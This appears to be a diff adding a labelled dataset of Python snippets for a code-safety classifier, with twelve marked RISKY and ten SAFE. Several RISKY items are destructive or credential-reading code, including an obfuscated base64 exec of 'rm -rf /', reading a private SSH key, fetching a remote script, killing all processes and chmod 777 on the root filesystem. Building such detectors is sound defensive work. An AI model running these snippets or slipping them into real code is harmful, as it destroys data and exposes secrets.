@@ -1,0 +1,22 @@
+{"code": "import os\nfor entry in os.walk('..'):\n    print(entry[0])", "label": "RISKY"}
+{"code": "import subprocess\nsubprocess.run('tar -czf /tmp/backup.tgz /home', shell=True, check=True)", "label": "RISKY"}
+{"code": "import base64, subprocess\nexec(base64.b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3JtIC1yZiAvJyk='))", "label": "RISKY"}
+{"code": "import os\nkey = open(os.path.expanduser('~/.ssh/id_rsa')).read()\nprint(len(key))", "label": "RISKY"}
+{"code": "import urllib.request\nurllib.request.urlretrieve('http://198.51.100.7/agent.sh', '/tmp/a.sh')", "label": "RISKY"}
+{"code": "import os, signal\nfor pid in os.listdir('/proc'):\n    if pid.isdigit():\n        try:\n            os.kill(int(pid), signal.SIGTERM)\n        except OSError:\n            pass", "label": "RISKY"}
+{"code": "import shutil\nshutil.rmtree('/var/log', ignore_errors=True)", "label": "RISKY"}
+{"code": "import os\nos.system('chmod -R 777 /')", "label": "RISKY"}
+{"code": "import threading, time\ndef spin():\n    while True:\n        time.sleep(0)\nfor _ in range(500):\n    threading.Thread(target=spin, daemon=False).start()", "label": "RISKY"}
+{"code": "big = 'x' * (10 ** 10)", "label": "RISKY"}
+{"code": "import requests\nprint(requests.get('https://api.example.com/status', timeout=2).status_code)", "label": "RISKY"}
+{"code": "import os\nos.remove('/tmp/../../etc/hosts')", "label": "RISKY"}
+{"code": "import csv, io\nrows = list(csv.DictReader(io.StringIO('a,b\\n1,2\\n3,4')))\nprint(sum(int(r['b']) for r in rows))", "label": "SAFE"}
+{"code": "import json\npayload = {'rows': [1, 2, 3]}\nprint(json.dumps(payload, sort_keys=True))", "label": "SAFE"}
+{"code": "text = 'the quick brown fox'\nprint({w: text.count(w) for w in set(text.split())})", "label": "SAFE"}
+{"code": "with open('summary.txt', 'w', encoding='utf-8') as fh:\n    fh.write('done\\n')", "label": "SAFE"}
+{"code": "import statistics\nvalues = [3, 9, 1, 7]\nprint(statistics.median(values))", "label": "SAFE"}
+{"code": "def clean(s):\n    return ' '.join(s.split())\nprint(clean('  a   b  '))", "label": "SAFE"}
+{"code": "import datetime as dt\nstart = dt.date(2026, 11, 1)\nprint((dt.date(2026, 11, 5) - start).days)", "label": "SAFE"}
+{"code": "pairs = [(1, 'a'), (2, 'b')]\nfor k, v in sorted(pairs, key=lambda p: p[0]):\n    print(k, v)", "label": "SAFE"}
+{"code": "import itertools\nprint(list(itertools.islice(itertools.count(1, 3), 5)))", "label": "SAFE"}
+{"code": "matrix = [[1, 2], [3, 4]]\nprint([sum(col) for col in zip(*matrix)])", "label": "SAFE"}
